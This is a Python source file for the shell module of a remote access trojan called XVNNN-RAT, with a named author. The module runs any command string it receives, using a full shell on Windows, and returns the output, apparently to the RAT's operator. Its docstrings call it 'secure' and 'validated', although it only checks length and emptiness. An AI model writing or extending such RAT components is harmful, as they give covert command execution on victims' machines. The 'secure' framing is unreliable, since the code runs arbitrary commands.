"""
Shell module for XVNNN-RAT
Author: Ali Zafar (alizafarbati@gmail.com)
"""

import subprocess
import platform
import logging
import shlex

logger = logging.getLogger(__name__)


class ShellModule:
    """Secure shell command execution module"""

    def __init__(self):
        self.name = "shell"
        self.max_command_length = 10000

    def execute(self, command):
        """Execute shell command with validation"""
        # Validate command length
        if len(command) > self.max_command_length:
            return {"type": "shell", "output": "Command too long"}

        # Validate command format (simple check for valid commands)
        if not command or not command.strip():
            return {"type": "shell", "output": "Empty command"}

        try:
            # Parse command into list for safer execution (shell=False)
            if platform.system() == "Windows":
                # On Windows, we need to handle commands differently
                # For safety, we'll use shell=True but with strict validation
                # In production, you should use a whitelist approach
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    encoding="cp437",
                    errors="replace",
                )
            else:
                # On Unix-like systems, we can use shell=False with parsed arguments
                # This is safer as it prevents shell injection
                args = shlex.split(command)
                result = subprocess.run(
                    args,
                    shell=False,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    encoding="utf-8",
                    errors="replace",
                )

            output = result.stdout + result.stderr
            if not output:
                output = "[Command executed successfully]\n"

            return {"type": "shell", "output": output}
        except subprocess.TimeoutExpired:
            logger.warning(f"Command timed out: {command[:50]}...")
            return {"type": "shell", "output": "Command timed out (30s limit)"}
        except Exception as e:
            logger.error(f"Command execution error: {e}")
            return {"type": "shell", "output": f"Error: {str(e)}"}
